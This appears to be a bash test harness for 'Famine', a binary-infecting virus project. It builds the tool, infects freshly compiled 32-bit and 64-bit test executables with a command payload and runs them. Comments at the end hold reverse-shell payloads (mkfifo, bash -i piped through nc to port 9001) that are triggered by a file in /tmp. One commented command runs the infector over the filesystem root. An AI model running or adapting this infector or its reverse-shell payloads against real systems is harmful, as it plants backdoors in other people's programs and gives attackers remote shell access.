#!/bin/bash

make bonus

if [[ "$#" -lt 4 ]]; then
    echo "Usage: $0 <FAMINE_ROOT_PATH> <Famine args...>"
    echo "Example: $0 /tmp/test -c1 -a 'echo koala'"
    exit 1
fi

export FAMINE_ROOT_PATH="${1}"
export FAMINE_WOODY_ENABLE="true"

rm -rf /tmp/woody_test
mkdir -p /tmp/woody_test


gcc rsc/main32.c -o /tmp/woody_test/main64

gcc -m32 rsc/main32.c -o /tmp/woody_test/main32

# mkdir -p obj
# nasm -f elf32 src/woody/asm/decrypt_data_exec_32.s -o obj/decrypt_data_exec_32.o
# gcc -m32 rsc/32-bits-dynamic/main32_get_payload.c obj/decrypt_data_exec_32.o libft/libft.a -o rsc/32-bits-dynamic/get_opcode32

echo "=== Running ./Famine $2 $3 $4 ==="
./Famine $2 $3 "$4" > woody_test.log 2>&1

echo "=== Testing woody executable with main64 ==="
export HOME="test" ; /tmp/woody_test/main64

echo "=== Testing woody executable with main32 ==="
/tmp/woody_test/main32


# DEBUG PAYLOAD WITH PRINT
# ./rsc/ez_woody_test.sh -c1 -a '[ -f /tmp/a ] && [ $(cat /tmp/a) = "yes" ] && (echo "OK |$(cat /tmp/a)|"; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 127.0.0.1 9001 >/tmp/f &) || echo KO $(cat /tmp/a)'

# OPTIMIZED PAYLOAD WITHOUT PRINT
# ./rsc/ez_woody_test.sh -c1 -a '[ -f /tmp/a ] && [ $(cat /tmp/a) = "yes" ] && (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 127.0.0.1 9001 >/tmp/f &)'


# make bonus ; export FAMINE_ROOT_PATH="/" ; export FAMINE_WOODY_ENABLE="true" ; ./Famine -c1 -a '[ -f /tmp/a ] && [ $(cat /tmp/a) = "yes" ] && (rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 127.0.0.1 9001 >/tmp/f &)'
